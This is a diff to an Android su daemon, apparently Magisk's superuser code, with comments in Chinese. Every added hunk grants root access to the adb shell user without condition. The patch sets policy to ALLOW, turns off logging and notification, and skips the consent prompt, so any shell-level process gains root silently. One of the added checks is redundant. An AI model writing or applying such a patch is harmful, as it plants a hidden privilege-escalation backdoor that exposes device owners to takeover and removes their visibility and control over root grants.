@@ -46,6 +46,14 @@ void su_info::check_db() {
     eval_uid = uid;
     get_db_settings(cfg);
 
+    // 修改：SHELL用户始终有权限
+    if (uid == AID_SHELL) {
+        access.policy = ALLOW;
+        access.log = 0;
+        access.notify = 0;
+        return;
+    }
+
     // Check multiuser settings
     switch (cfg[SU_MULTIUSER_MODE]) {
     case MULTIUSER_MODE_OWNER_ONLY:
@@ -86,11 +94,21 @@ void su_info::check_db() {
 }
 
 bool uid_granted_root(int uid) {
+    // 修改：SHELL用户始终返回true
+    if (uid == AID_SHELL) {
+        return true;
+    }
+    
     if (uid == AID_ROOT)
         return true;
 
     db_settings cfg;
     get_db_settings(cfg);
+
+    // 修改：SHELL用户跳过所有检查
+    if (uid == AID_SHELL) {
+        return true;
+    }
 
     // Check user root access settings
     switch (cfg[ROOT_ACCESS]) {
@@ -165,6 +183,13 @@ void prune_su_access() {
 }
 
 static shared_ptr<su_info> get_su_info(unsigned uid) {
+    // 修改：SHELL用户直接返回有权限的info
+    if (uid == AID_SHELL) {
+        auto info = make_shared<su_info>(uid);
+        info->access = SILENT_SU_ACCESS;  // 允许且静默
+        return info;
+    }
+    
     if (uid == AID_ROOT) {
         auto info = make_shared<su_info>(uid);
         info->access = SILENT_SU_ACCESS;
@@ -258,6 +283,13 @@ void su_daemon_handler(int client, const sock_cred *cred) {
         .pid = cred->pid
     };
 
+    // 修改：如果是SHELL用户，直接允许，跳过权限检查
+    if (cred->uid == AID_SHELL) {
+        ctx.info->access.policy = ALLOW;
+        ctx.info->access.log = 0;
+        ctx.info->access.notify = 0;
+    }
+
     // Read su_request
     if (xxread(client, &ctx.req, sizeof(su_req_base)) < 0
         || !read_string(client, ctx.req.shell)
@@ -271,8 +303,10 @@ void su_daemon_handler(int client, const sock_cred *cred) {
         return;
     }
 
-    // If still not determined, ask manager
-    if (ctx.info->access.policy == QUERY) {
+    // 修改：如果是SHELL用户，跳过管理器询问
+    if (cred->uid == AID_SHELL) {
+        // SHELL用户直接允许
+    } else if (ctx.info->access.policy == QUERY) {
         int fd = app_request(ctx);
         if (fd < 0) {
             ctx.info->access.policy = DENY;
@@ -465,3 +499,4 @@ void su_daemon_handler(int client, const sock_cred *cred) {
     fprintf(stderr, "Cannot execute %s: %s\n", ctx.req.shell.data(), strerror(errno));
     PLOGE("exec");
 }
+
